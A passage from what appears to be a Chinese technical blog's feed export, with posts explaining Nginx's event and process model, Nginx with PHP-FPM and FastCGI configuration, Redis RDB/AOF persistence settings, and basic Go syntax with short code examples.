<li><p>内核微调<br> 这一点其实不算epoll的优点了，而是整个linux平台的优点。也许你可以怀疑linux平台，但是你无法回避linux平台赋予你微调内核的能力。比如，内核TCP/IP协 议栈使用内存池管理sk_buff结构，那么可以在运行时期动态调整这个内存pool(skb_head_pool)的大小— 通过echo XXXX&gt;/proc/sys/net/core/hot_list_length完成。再比如listen函数的第2个参数(TCP完成3次握手 的数据包队列长度)，也可以根据你平台内存大小动态调整。更甚至在一个数据包面数目巨大但同时每个数据包本身大小却很小的特殊系统上尝试最新的NAPI网卡驱动架构。</p>
</li>
</ol>
<p>(epoll内容，参考epoll_互动百科)</p>
<p> 推荐设置worker的个数为cpu的核数，在这里就很容易理解了，更多的worker数，只会导致进程来竞争cpu资源了，从而带来不必要的上下文切换。而且，nginx为了更好的利用多核特性，提供了cpu亲缘性的绑定选项，我们可以将某一个进程绑定在某一个核上，这样就不会因为进程的切换带来cache的失效。像这种小的优化在nginx中非常常见，同时也说明了nginx作者的苦心孤诣。比如，nginx在做4个字节的字符串比较时，会将4个字符转换成一个int型，再作比较，以减少cpu的指令数等等。</p>
<p>代码来总结一下nginx的事件处理模型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while (true) &#123;</span><br><span class="line">    for t in run_tasks:</span><br><span class="line">        t.handler();</span><br><span class="line">    update_time(&amp;now);</span><br><span class="line">    timeout &#x3D; ETERNITY;</span><br><span class="line">    for t in wait_tasks: &#x2F;* sorted already *&#x2F;</span><br><span class="line">        if (t.time &lt;&#x3D; now) &#123;</span><br><span class="line">            t.timeout_handler();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            timeout &#x3D; t.time - now;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    nevents &#x3D; poll_function(events, timeout);</span><br><span class="line">    for i in nevents:</span><br><span class="line">        task t;</span><br><span class="line">        if (events[i].type &#x3D;&#x3D; READ) &#123;</span><br><span class="line">            t.handler &#x3D; read_handler;</span><br><span class="line">        &#125; else &#123; &#x2F;* events[i].type &#x3D;&#x3D; WRITE *&#x2F;</span><br><span class="line">            t.handler &#x3D; write_handler;</span><br><span class="line">        &#125;</span><br><span class="line">        run_tasks_add(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx原理</title>
    <url>/2018/05/12/Nginx%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p> </p>
<blockquote>
<p>NGINX以高性能的负载均衡器，缓存，和web服务器闻名，驱动了全球超过 40% 最繁忙的网站。在大多数场景下，默认的 NGINX 和 Linux 设置可以很好的工作，但要达到最佳性能，有些时候必须做些调整。首先我们先了解其工作原理。</p>
</blockquote>
<h2 id="Nginx的模块与工作原理"><a href="#Nginx的模块与工作原理" class="headerlink" title=" Nginx的模块与工作原理"></a> Nginx的模块与工作原理</h2><p>Nginx由内核和模块组成，其中，内核的设计非常微小和简洁，完成的工作也非常简单，仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。</p>
<h3 id="Nginx的模块从结构上分为核心模块、基础模块和第三方模块："><a href="#Nginx的模块从结构上分为核心模块、基础模块和第三方模块：" class="headerlink" title="Nginx的模块从结构上分为核心模块、基础模块和第三方模块："></a>Nginx的模块从结构上分为核心模块、基础模块和第三方模块：</h3><ol>
<li><p>核心模块：HTTP模块、EVENT模块和MAIL模块</p>
</li>
<li><p>基础模块：HTTP Access模块、HTTP FastCGI模块、HTTP Proxy模块和HTTP Rewrite模块，</p>
</li>
<li><p>第三方模块：HTTP Upstream Request Hash模块、Notice模块和HTTP Access Key模块。</p>
</li>
</ol>
<p>用户根据自己的需要开发的模块都属于第三方模块。正是有了这么多模块的支撑，Nginx的功能才会如此强大。</p>
<h3 id="Nginx的模块从功能上分为如下三类。"><a href="#Nginx的模块从功能上分为如下三类。" class="headerlink" title="Nginx的模块从功能上分为如下三类。"></a>Nginx的模块从功能上分为如下三类。</h3><ol>
<li><p>Handlers（处理器模块）。此类模块直接处理请求，并进行输出内容和修改headers信息等操作。Handlers处理器模块一般只能有一个。</p>
</li>
<li><p>Filters （过滤器模块）。此类模块主要对其他处理器模块输出的内容进行修改操作，最后由Nginx输出。</p>
</li>
<li><p>Proxies （代理类模块）。此类模块是Nginx的HTTP Upstream之类的模块，这些模块主要与后端一些服务比如FastCGI等进行交互，实现服务代理和负载均衡等功能。</p>
</li>
</ol>
<p>图1-1展示了Nginx模块常规的HTTP请求和响应的过程。<br><img src="http://qiniu.fengmumiao.com/nginx-yuanli-1-1.jpg"></p>
<p>图1-1展示了Nginx模块常规的HTTP请求和响应的过程。</p>
<p>Nginx本身做的工作实际很少，当它接到一个HTTP请求时，它仅仅是通过查找配置文件将此次请求映射到一个location block，而此location中所配置的各个指令则会启动不同的模块去完成工作，因此模块可以看做Nginx真正的劳动工作者。通常一个location中的指令会涉及一个handler模块和多个filter模块（当然，多个location可以复用同一个模块）。handler模块负责处理请求，完成响应内容的生成，而filter模块对响应内容进行处理。</p>
<p>Nginx的模块直接被编译进Nginx，因此属于静态编译方式。启动Nginx后，Nginx的模块被自动加载，不像Apache，首先将模块编译为一个so文件，然后在配置文件中指定是否进行加载。在解析配置文件时，Nginx的每个模块都有可能去处理某个请求，但是同一个处理请求只能由一个模块来完成。 </p>
<h2 id="Nginx的进程模型"><a href="#Nginx的进程模型" class="headerlink" title=" Nginx的进程模型"></a> Nginx的进程模型</h2><p>在工作方式上，Nginx分为单工作进程和多工作进程两种模式。在单工作进程模式下，除主进程外，还有一个工作进程，工作进程是单线程的；在多工作进程模式下，每个工作进程包含多个线程。Nginx默认为单工作进程模式。</p>
<p>Nginx在启动后，会有一个master进程和多个worker进程。</p>
<h3 id="master进程"><a href="#master进程" class="headerlink" title="master进程"></a>master进程</h3><p>主要用来管理worker进程，包含：接收来自外界的信号，向各worker进程发送信号，监控worker进程的运行状态，当worker进程退出后(异常情况下)，会自动重新启动新的worker进程。</p>
<p>master进程充当整个进程组与用户的交互接口，同时对进程进行监护。它不需要处理网络事件，不负责业务的执行，只会通过管理worker进程来实现重启服务、平滑升级、更换日志文件、配置文件实时生效等功能。</p>
<p>我们要控制nginx，只需要通过kill向master进程发送信号就行了。比如kill -HUP pid，则是告诉nginx，从容地重启nginx，我们一般用这个信号来重启nginx，或重新加载配置，因为是从容地重启，因此服务是不中断的。master进程在接收到HUP信号后是怎么做的呢？首先master进程在接到信号后，会先重新加载配置文件，然后再启动新的worker进程，并向所有老的worker进程发送信号，告诉他们可以光荣退休了。新的worker在启动后，就开始接收新的请求，而老的worker在收到来自master的信号后，就不再接收新的请求，并且在当前进程中的所有未处理完的请求处理完成后，再退出。当然，直接给master进程发送信号，这是比较老的操作方式，nginx在0.8版本之后，引入了一系列命令行参数，来方便我们管理。比如，./nginx -s reload，就是来重启nginx，./nginx -s stop，就是来停止nginx的运行。如何做到的呢？我们还是拿reload来说，我们看到，执行命令时，我们是启动一个新的nginx进程，而新的nginx进程在解析到reload参数后，就知道我们的目的是控制nginx来重新加载配置文件了，它会向master进程发送信号，然后接下来的动作，就和我们直接向master进程发送信号一样了。</p>
<h3 id="worker进程："><a href="#worker进程：" class="headerlink" title="worker进程："></a>worker进程：</h3><p>而基本的网络事件，则是放在worker进程中来处理了。多个worker进程之间是对等的，他们同等竞争来自客户端的请求，各进程互相之间是独立的。一个请求，只可能在一个worker进程中处理，一个worker进程，不可能处理其它进程的请求。worker进程的个数是可以设置的，一般我们会设置与机器cpu核数一致，这里面的原因与nginx的进程模型以及事件处理模型是分不开的。</p>
<p>worker进程之间是平等的，每个进程，处理请求的机会也是一样的。当我们提供80端口的http服务时，一个连接请求过来，每个进程都有可能处理这个连接，怎么做到的呢？首先，每个worker进程都是从master进程fork过来，在master进程里面，先建立好需要listen的socket（listenfd）之后，然后再fork出多个worker进程。所有worker进程的listenfd会在新连接到来时变得可读，为保证只有一个进程处理该连接，所有worker进程在注册listenfd读事件前抢accept_mutex，抢到互斥锁的那个进程注册listenfd读事件，在读事件里调用accept接受该连接。当一个worker进程在accept这个连接之后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接，这样一个完整的请求就是这样的了。我们可以看到，一个请求，完全由worker进程来处理，而且只在一个worker进程中处理。worker进程之间是平等的，每个进程，处理请求的机会也是一样的。当我们提供80端口的http服务时，一个连接请求过来，每个进程都有可能处理这个连接，怎么做到的呢？首先，每个worker进程都是从master进程fork过来，在master进程里面，先建立好需要listen的socket（listenfd）之后，然后再fork出多个worker进程。所有worker进程的listenfd会在新连接到来时变得可读，为保证只有一个进程处理该连接，所有worker进程在注册listenfd读事件前抢accept_mutex，抢到互斥锁的那个进程注册listenfd读事件，在读事件里调用accept接受该连接。当一个worker进程在accept这个连接之后，就开始读取请求，解析请求，处理请求，产生数据后，再返回给客户端，最后才断开连接，这样一个完整的请求就是这样的了。我们可以看到，一个请求，完全由worker进程来处理，而且只在一个worker进程中处理。<br>nginx的进程模型，可以由下图来表示：<br><img src="http://qiniu.fengmumiao.com/nginx-yuanli-1-2.jpg"></p>
<h3 id="惊群现象"><a href="#惊群现象" class="headerlink" title="惊群现象"></a>惊群现象</h3><p>主进程（master 进程）首先通过 socket() 来创建一个 sock 文件描述符用来监听，然后fork生成子进程（workers 进程），子进程将继承父进程的 sockfd（socket 文件描述符），之后子进程 accept() 后将创建已连接描述符（connected descriptor）），然后通过已连接描述符来与客户端通信。</p>
<p>那么，由于所有子进程都继承了父进程的 sockfd，那么当连接进来时，所有子进程都将收到通知并“争着”与它建立连接，这就叫“惊群现象”。大量的进程被激活又挂起，只有一个进程可以accept() 到这个连接，这当然会消耗系统资源。</p>
<h3 id="Nginx对惊群现象的处理"><a href="#Nginx对惊群现象的处理" class="headerlink" title="Nginx对惊群现象的处理"></a>Nginx对惊群现象的处理</h3><p>Nginx 提供了一个 accept_mutex 这个东西，这是一个加在accept上的一把共享锁。即每个 worker 进程在执行 accept 之前都需要先获取锁，获取不到就放弃执行 accept()。有了这把锁之后，同一时刻，就只会有一个进程去 accpet()，这样就不会有惊群问题了。accept_mutex 是一个可控选项，我们可以显示地关掉，默认是打开的。</p>
<h2 id="Nginx-FastCGI运行原理"><a href="#Nginx-FastCGI运行原理" class="headerlink" title=" Nginx+FastCGI运行原理"></a> Nginx+FastCGI运行原理</h2><h3 id="什么是-FastCGI"><a href="#什么是-FastCGI" class="headerlink" title="什么是 FastCGI"></a>什么是 FastCGI</h3><p>FastCGI是一个可伸缩地、高速地在HTTP server和动态脚本语言间通信的接口。多数流行的HTTP server都支持FastCGI，包括Apache、Nginx和lighttpd等。同时，FastCGI也被许多脚本语言支持，其中就有PHP。</p>
<p>FastCGI是从CGI发展改进而来的。传统CGI接口方式的主要缺点是性能很差，因为每次HTTP服务器遇到动态程序时都需要重新启动脚本解析器来执行解析，然后将结果返回给HTTP服务器。这在处理高并发访问时几乎是不可用的。另外传统的CGI接口方式安全性也很差，现在已经很少使用了。</p>
<p>FastCGI接口方式采用C/S结构，可以将HTTP服务器和脚本解析服务器分开，同时在脚本解析服务器上启动一个或者多个脚本解析守护进程。当HTTP服务器每次遇到动态程序时，可以将其直接交付给FastCGI进程来执行，然后将得到的结果返回给浏览器。这种方式可以让HTTP服务器专一地处理静态请求或者将动态脚本服务器的结果返回给客户端，这在很大程度上提高了整个应用系统的性能。</p>
<h3 id="Nginx-FastCGI运行原理-1"><a href="#Nginx-FastCGI运行原理-1" class="headerlink" title="Nginx+FastCGI运行原理"></a>Nginx+FastCGI运行原理</h3><p>Nginx不支持对外部程序的直接调用或者解析，所有的外部程序（包括PHP）必须通过FastCGI接口来调用。FastCGI接口在Linux下是socket（这个socket可以是文件socket，也可以是ip socket）。</p>
<p>wrapper：为了调用CGI程序，还需要一个FastCGI的wrapper（wrapper可以理解为用于启动另一个程序的程序），这个wrapper绑定在某个固定socket上，如端口或者文件socket。当Nginx将CGI请求发送给这个socket的时候，通过FastCGI接口，wrapper接收到请求，然后Fork(派生）出一个新的线程，这个线程调用解释器或者外部程序处理脚本并读取返回数据；接着，wrapper再将返回的数据通过FastCGI接口，沿着固定的socket传递给Nginx；最后，Nginx将返回的数据（html页面或者图片）发送给客户端。这就是Nginx+FastCGI的整个运作过程，如图1-3所示。<br><img src="http://qiniu.fengmumiao.com/nginx-yuanli-1-3.jpg"><br>     <br>所以，我们首先需要一个wrapper，这个wrapper需要完成的工作：</p>
<p>通过调用fastcgi（库）的函数通过socket和ningx通信（读写socket是fastcgi内部实现的功能，对wrapper是非透明的）<br>调度thread，进行fork和kill和application（php）进行通信</p>
<h3 id="spawn-fcgi与PHP-FPM"><a href="#spawn-fcgi与PHP-FPM" class="headerlink" title="spawn-fcgi与PHP-FPM"></a>spawn-fcgi与PHP-FPM</h3><p>FastCGI接口方式在脚本解析服务器上启动一个或者多个守护进程对动态脚本进行解析，这些进程就是FastCGI进程管理器，或者称为FastCGI引擎。 spawn-fcgi与PHP-FPM就是支持PHP的两个FastCGI进程管理器。因此HTTPServer完全解放出来，可以更好地进行响应和并发处理。</p>
<p>spawn-fcgi与PHP-FPM的异同：<br>  1）spawn-fcgi是HTTP服务器lighttpd的一部分，目前已经独立成为一个项目，一般与lighttpd配合使用来支持PHP。但是ligttpd的spwan-fcgi在高并发访问的时候，会出现内存泄漏甚至自动重启FastCGI的问题。即：PHP脚本处理器当机，这个时候如果用户访问的话，可能就会出现白页(即PHP不能被解析或者出错)。<br>  2）Nginx是个轻量级的HTTP server，必须借助第三方的FastCGI处理器才可以对PHP进行解析，因此其实这样看来nginx是非常灵活的，它可以和任何第三方提供解析的处理器实现连接从而实现对PHP的解析(在nginx.conf中很容易设置)。nginx也可以使用spwan-fcgi(需要一同安装lighttpd，但是需要为nginx避开端口，一些较早的blog有这方面安装的教程)，但是由于spawn-fcgi具有上面所述的用户逐渐发现的缺陷，现在慢慢减少用nginx+spawn-fcgi组合了。</p>
<p>由于spawn-fcgi的缺陷，现在出现了第三方(目前已经加入到PHP core中)的PHP的FastCGI处理器PHP-FPM，它和spawn-fcgi比较起来有如下优点：</p>
<p>由于它是作为PHP的patch补丁来开发的，安装的时候需要和php源码一起编译，也就是说编译到php core中了，因此在性能方面要优秀一些；</p>
<p>同时它在处理高并发方面也优于spawn-fcgi，至少不会自动重启fastcgi处理器。因此，推荐使用Nginx+PHP/PHP-FPM这个组合对PHP进行解析。</p>
<p>相对Spawn-FCGI，PHP-FPM在CPU和内存方面的控制都更胜一筹，而且前者很容易崩溃，必须用crontab进行监控，而PHP-FPM则没有这种烦恼。</p>
<p>FastCGI 的主要优点是把动态语言和HTTP Server分离开来，所以Nginx与PHP/PHP-FPM经常被部署在不同的服务器上，以分担前端Nginx服务器的压力，使Nginx专一处理静态请求和转发动态请求，而PHP/PHP-FPM服务器专一解析PHP动态请求。</p>
<h2 id="Nginx-PHP-FPM"><a href="#Nginx-PHP-FPM" class="headerlink" title="Nginx+PHP-FPM"></a>Nginx+PHP-FPM</h2><p>PHP-FPM是管理FastCGI的一个管理器，它作为PHP的插件存在，在安装PHP要想使用PHP-FPM时在老php的老版本（php5.3.3之前）就需要把PHP-FPM以补丁的形式安装到PHP中，而且PHP要与PHP-FPM版本一致，这是必须的）</p>
<p>PHP-FPM其实是PHP源代码的一个补丁，旨在将FastCGI进程管理整合进PHP包中。必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。</p>
<p>PHP5.3.3已经集成php-fpm了，不再是第三方的包了。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置，比spawn-fcgi具有更多优点，所以被PHP官方收录了。在./configure的时候带 –enable-fpm参数即可开启PHP-FPM。</p>
<p>fastcgi已经在php5.3.5的core中了，不必在configure时添加 –enable-fastcgi了。老版本如php5.2的需要加此项。</p>
<p>当我们安装Nginx和PHP-FPM完后，配置信息：</p>
<p>PHP-FPM的默认配置php-fpm.conf：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     listen_address  127.0.0.1:9000 #这个表示php的fastcgi进程监听的ip地址以及端口</span><br><span class="line">      start_servers</span><br><span class="line">      min_spare_servers</span><br><span class="line">      max_spare_servers</span><br></pre></td></tr></table></figure>

<p>Nginx配置运行php： 编辑nginx.conf加入如下语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">      location ~ \.php$ &#123;</span><br><span class="line">            root html;   </span><br><span class="line">            fastcgi_pass 127.0.0.1:9000; 指定了fastcgi进程侦听的端口,nginx就是通过这里与php交互的</span><br><span class="line">            fastcgi_index index.php;</span><br><span class="line">            include fastcgi_params;</span><br><span class="line">             fastcgi_param SCRIPT_FILENAME   &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html$fastcgi_script_name;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>Nginx通过location指令，将所有以php为后缀的文件都交给127.0.0.1:9000来处理，而这里的IP地址和端口就是FastCGI进程监听的IP地址和端口。<br>   <br>其整体工作流程：<br>1)、FastCGI进程管理器php-fpm自身初始化，启动主进程php-fpm和启动start_servers个CGI 子进程。<br>主进程php-fpm主要是管理fastcgi子进程，监听9000端口。<br>fastcgi子进程等待来自Web Server的连接。<br>2)、当客户端请求到达Web Server Nginx是时，Nginx通过location指令，将所有以php为后缀的文件都交给127.0.0.1:9000来处理，即Nginx通过location指令，将所有以php为后缀的文件都交给127.0.0.1:9000来处理。<br>3）FastCGI进程管理器PHP-FPM选择并连接到一个子进程CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程。<br>4)、FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。<br>5)、FastCGI子进程接着等待并处理来自FastCGI进程管理器（运行在 WebServer中）的下一个连接。</p>
<hr>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>Nginx</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis持久化存储</title>
    <url>/2018/05/11/redis%E6%8C%81%E4%B9%85%E5%8C%96%E5%AD%98%E5%82%A8/</url>
    <content><![CDATA[<blockquote>
<p><code>Redis</code>虽然是一种内存型数据库，一旦服务器进程退出，数据库的数据就会丢失，为了解决这个问题<code>Redis</code>提供了两种持久化的方案，将内存中的数据保存到磁盘中，避免数据的丢失。</p>
</blockquote>
<h2 id="RDB持久化"><a href="#RDB持久化" class="headerlink" title="RDB持久化"></a>RDB持久化</h2><hr>
<p><code>redis</code>提供了<code>RDB持久化</code>的功能，这个功能可以将<code>redis</code>在内存中的的状态保存到硬盘中，它可以<strong>手动执行</strong>，也可以再<code>redis.conf</code>中配置，<strong>定期执行</strong>。 RDB持久化产生的RDB文件是一个<strong>经过压缩</strong>的二进制文件，这个文件被保存在硬盘中，redis可以通过这个文件还原数据库当时的状态。</p>
<h3 id="RDB的创建与载入"><a href="#RDB的创建与载入" class="headerlink" title="RDB的创建与载入"></a>RDB的创建与载入</h3><p><code>RDB文件</code>可以通过两个命令来生成：</p>
<ul>
<li><code>SAVE</code>：阻塞redis的<strong>服务器进程</strong>，直到<code>RDB文件</code>被创建完毕。</li>
<li><code>BGSAVE</code>：派生(fork)一个子进程来创建新的<code>RDB文件</code>，记录接收到<code>BGSAVE</code>当时的数据库状态，父进程继续处理接收到的命令，子进程完成文件的创建之后，会<strong>发送信号</strong>给父进程，而与此同时，父进程处理命令的同时，通过<strong>轮询</strong>来接收子进程的信号。</li>
</ul>
<p>而RDB文件的载入一般情况是自动的，redis服务器启动的时候，<code>redis</code>服务器再启动的时候如果检测到RDB文件的存在，那么redis会自动载入这个文件。 如果服务器开启了<code>AOF持久化</code>，那么服务器会优先使用AOF文件来还原数据库状态。 RDB是通过保存键值对来记录数据库状态的，采用copy on write的模式，每次都是全量的备份。</p>
<h3 id="自动保存间隔"><a href="#自动保存间隔" class="headerlink" title="自动保存间隔"></a>自动保存间隔</h3><p><code>BGSAVE</code>可以在不阻塞主进程的情况下完成数据的备份。可以通过<code>redis.conf</code>中设置多个自动保存条件，只要有一个条件被满足，服务器就会执行<code>BGSAVE</code>命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\# 以下配置表示的条件：</span><br><span class="line">\# 服务器在900秒之内被修改了1次</span><br><span class="line">save 900 1</span><br><span class="line">\# 服务器在300秒之内被修改了10次</span><br><span class="line">save 300 10</span><br><span class="line">\# 服务器在60秒之内被修改了10000次</span><br><span class="line">save 60 10000</span><br></pre></td></tr></table></figure>

<p> </p>
<h2 id="AOF持久化"><a href="#AOF持久化" class="headerlink" title="AOF持久化"></a>AOF持久化</h2><hr>
<p><code>AOF持久化</code>（Append-Only-File），与RDB持久化不同，AOF持久化是通过保存Redis服务器锁执行的写状态来记录数据库的。 具体来说，RDB持久化相当于备份数据库状态，而AOF持久化是备份数据库接收到的<strong>命令</strong>，所有被写入AOF的命令都是以redis的协议格式来保存的。 在<code>AOF持久化</code>的文件中，数据库会记录下所有变更数据库状态的命令，除了指定数据库的select命令，其他的命令都是来自client的，这些命令会以追加(append)的形式保存到文件中。 服务器配置中有一项<code>appendfsync</code>，这个配置会影响服务器多久完成一次命令的记录：</p>
<ul>
<li><code>always</code>：将缓存区的内容总是即时写到AOF文件中。</li>
<li><code>everysec</code>：将缓存区的内容每隔一秒写入AOF文件中。</li>
<li><code>no</code> ：写入AOF文件中的操作由操作系统决定，一般而言为了提高效率，操作系统会等待缓存区被填满，才会开始同步数据到磁盘。</li>
</ul>
<p>redis默认实用的是<code>everysec</code>。 redis在载入<code>AOF文件</code>的时候，会创建一个虚拟的client，把AOF中每一条命令都执行一遍，最终还原回数据库的状态，它的载入也是自动的。在RDB和AOF备份文件都有的情况下，redis会优先载入<code>AOF备份文件</code> AOF文件可能会随着服务器运行的时间越来越大，可以利用AOF重写的功能，来控制AOF文件的大小。AOF重写功能会首先读取数据库中现有的键值对状态，然后根据类型使用一条命令来替代前的键值对多条命令。 AOF重写功能有大量写入操作，所以redis才用子进程来处理AOF重写。这里带来一个新的问题，由于处理重新的是子进程，这样意味着如果主线程的数据在此时被修改，备份的数据和主库的数据将会有不一致的情况发生。因此redis还设置了一个AOF重写缓冲区，这个缓冲区在子进程被创建开始之后开始使用，这个期间，所有的命令会被存两份，一份在AOF缓存空间，一份在AOF重写缓冲区，当AOF重写完成之后，子进程发送信号给主进程，通知主进程将AOF重写缓冲区的内容添加到AOF文件中。</p>
<h3 id="相关配置"><a href="#相关配置" class="headerlink" title="相关配置"></a>相关配置</h3><pre><code>#AOF 和 RDB 持久化方式可以同时启动并且无冲突。  
#如果AOF开启，启动redis时会加载aof文件，这些文件能够提供更好的保证。
appendonly yes

# 只增文件的文件名称。（默认是appendonly.aof）  
# appendfilename appendonly.aof
#redis支持三种不同的写入方式：  
#  
# no:不调用，之等待操作系统来清空缓冲区当操作系统要输出数据时。很快。  
# always: 每次更新数据都写入仅增日志文件。慢，但是最安全。
# everysec: 每秒调用一次。折中。
appendfsync everysec  

# 设置为yes表示rewrite期间对新写操作不fsync,暂时存在内存中,等rewrite完成后再写入.官方文档建议如果你有特殊的情况可以配置为&#39;yes&#39;。但是配置为&#39;no&#39;是最为安全的选择。
no-appendfsync-on-rewrite no  

# 自动重写只增文件。  
# redis可以自动盲从的调用‘BGREWRITEAOF’来重写日志文件，如果日志文件增长了指定的百分比。  
# 当前AOF文件大小是上次日志重写得到AOF文件大小的二倍时，自动启动新的日志重写过程。
auto-aof-rewrite-percentage 100  
# 当前AOF文件启动新的日志重写过程的最小值，避免刚刚启动Reids时由于文件尺寸较小导致频繁的重写。
auto-aof-rewrite-min-size 64mb</code></pre>
<h2 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h2><p>–</p>
<ul>
<li><code>AOF</code>更安全，可将数据及时同步到文件中，但需要较多的磁盘IO，<code>AOF文件</code>尺寸较大，文件内容恢复相对较慢， 也更完整。</li>
<li><code>RDB</code>持久化，安全性较差，它是正常时期数据备份及 <code>master-slave</code>数据同步的最佳手段，文件尺寸较小，恢复数度较快。</li>
</ul>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>golang中的一些基本问题</title>
    <url>/2018/01/08/golang%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="import中下划线的作用"><a href="#import中下划线的作用" class="headerlink" title="import中下划线的作用"></a>import中下划线的作用</h3><blockquote>
<p>import 下划线（如：import _ hello/imp）的作用：当导入一个包时，该包下的文件里所有init()函数都会被执行，然而，有些时候我们并不需要把整个包都导入进来，仅仅是是希望它执行init()函数而已。这个时候就可以使用 import _ 引用该包。即使用【import _ 包路径】只是引用该包，仅仅是为了调用init()函数，所以无法通过包名来调用包中的其他函数。</p>
</blockquote>
<h3 id="变量赋值"><a href="#变量赋值" class="headerlink" title="变量赋值"></a>变量赋值</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f, err &#x3D; os.Open(&quot;foo.txt&quot;) &#x2F;&#x2F; function call returns two values</span><br></pre></td></tr></table></figure>


<p>通常，这类函数会用额外的返回值来表达某种错误类型，例如os.Open是用额外的返回值返回一个error类型的错误，还有一些是用来返回布尔值，通常被称为ok。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_, err &#x3D; io.Copy(dst, src) &#x2F;&#x2F; 丢弃字节数</span><br><span class="line">_, ok &#x3D; x.(T) &#x2F;&#x2F; 只检测类型，忽略具体值</span><br><span class="line">和变量声明一样，我们可以用下划线空白标识符_来丢弃不需要的值。</span><br></pre></td></tr></table></figure>


<h3 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h3><figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">name</span><span class="params">(parameter-list)</span> <span class="params">(result-list)</span></span> &#123;</span><br><span class="line">    body</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hypot</span><span class="params">(x, y <span class="keyword">float64</span>)</span> <span class="title">float64</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> math.Sqrt(x\*x + y\*y)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(hypot(<span class="number">3</span>,<span class="number">4</span>)) <span class="comment">// &quot;5&quot;</span></span><br></pre></td></tr></table></figure>


<p>#多返回值</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="comment">// findLinks performs an HTTP GET request for url, parses the</span></span><br><span class="line"><span class="comment">// response as HTML, and extracts and returns the links.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findLinks</span><span class="params">(url <span class="keyword">string</span>)</span> <span class="params">(\[\]<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">    resp, err := http.Get(url)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> resp.StatusCode != http.StatusOK &#123;</span><br><span class="line">        resp.Body.Close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;getting %s: %s&quot;</span>, url, resp.Status)</span><br><span class="line">    &#125;</span><br><span class="line">    doc, err := html.Parse(resp.Body)</span><br><span class="line">    resp.Body.Close()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;parsing %s as HTML: %v&quot;</span>, url, err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> visit(<span class="literal">nil</span>, doc), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="可变参数"><a href="#可变参数" class="headerlink" title="可变参数"></a>可变参数</h3><p>在声明可变参数函数时，需要在参数列表的最后一个参数类型之前加上省略符号“…”，这表示该函数会接收任意数量的该类型参数。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(vals...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    total := <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _, val := <span class="keyword">range</span> vals &#123;</span><br><span class="line">        total += val</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>sum函数返回任意个int型参数的和。在函数体中,vals被看作是类型为[] int的切片。sum可以接收任意数量的int型参数：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line">fmt.Println(sum())           <span class="comment">// &quot;0&quot;</span></span><br><span class="line">fmt.Println(sum(<span class="number">3</span>))          <span class="comment">// &quot;3&quot;</span></span><br><span class="line">fmt.Println(sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)) <span class="comment">// &quot;10&quot;</span></span><br></pre></td></tr></table></figure>

<p>可变参数函数经常被用于格式化字符串。下面的errorf函数构造了一个以行号开头的，经过格式化的错误信息。函数名的后缀f是一种通用的命名规范，代表该可变参数函数可以接收Printf风格的格式化字符串。</p>
